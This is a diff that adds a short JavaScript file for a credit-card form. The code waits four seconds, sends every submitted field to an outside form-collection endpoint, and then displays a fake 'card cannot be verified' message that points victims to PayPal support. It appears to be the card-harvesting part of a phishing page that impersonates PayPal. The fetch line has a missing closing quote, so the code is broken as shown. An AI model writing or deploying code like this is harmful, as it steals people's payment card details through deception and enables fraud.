@@ -1,0 +1,23 @@
+ const form = document.getElementById('credit-card-form');
+const submitBtn = document.getElementById('submit-button');
+const loadingMessage = document.getElementById('loading-message');
+const successMessage = document.getElementById('success-message');
+
+form.addEventListener('submit', (e) => {
+    e.preventDefault();
+    const formData = new FormData(form);
+    loadingMessage.style.display = 'block';
+    setTimeout(() => {
+        fetch('https://usebasin.com/f/46d11386195a, {
+            method: 'POST',
+            body: formData,
+        })
+        .then((response) => response.json())
+        .then((data) => {
+            successMessage.innerText = 'Credit Card Update Required:  The credit card information you provided cannot be verified. Please ensure that the information you provided is correct and try again or contact us on http://www.paypal.com/support.';
+            successMessage.style.display = 'block';
+            loadingMessage.style.display = 'none';
+        })
+        .catch((error) => console.error(error));
+    }, 4000);
+});
